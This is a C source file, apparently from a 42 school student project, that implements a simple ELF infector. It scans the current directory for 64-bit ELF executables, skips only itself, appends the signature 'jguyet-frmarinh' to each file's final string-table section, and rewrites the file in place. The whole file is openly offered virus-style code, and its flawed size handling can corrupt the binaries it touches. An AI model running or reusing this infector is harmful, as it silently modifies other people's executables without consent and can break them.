/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/03/17 19:56:28 by jguyet            #+#    #+#             */
/*   Updated: 2018/03/17 19:56:30 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

void	infect_elf(char *file_path)
{
	t_elf *elf;

	elf = read_elf(file_path);
	if (elf == NULL)
		return ;
	int size = elf->get_nbr_sections(elf->sections);
	int strtab_index = elf->get_index_section(elf, ".strtab");
	int shstrtab_index = elf->get_index_section(elf, ".shstrtab");
	t_section *section = elf->get_section_by_index(elf, size);

	if (section != NULL && (strtab_index == size || shstrtab_index == size)) {
		char *content = malloc(section->data->sh_size + 16);
		memcpy(content, section->content, section->data->sh_size);
		memcpy(content + section->data->sh_size, "jguyet-frmarinh", 15);
		section->data->sh_size += 16;
		free(section->content);
		section->content = content;
	}
	char *data = write_elf(elf);

	int fd = open(file_path, O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);

	if (fd > 0)
	{
		write(fd, data, elf->len);
	}
	destruct_elf(elf);
}

int		main(int argc, char **argv)
{
	(void)argc;
	char **files = get_elf_files(NULL, ".", ELF_64);
	int i = 0;

	while (i < (int)array_length(files))
	{
		if (strcmp(argv[0], files[i]) == 0)
		{
			i++;
			continue ;
		}
		infect_elf(files[i]);
		i++;
	}
	return (0);
}
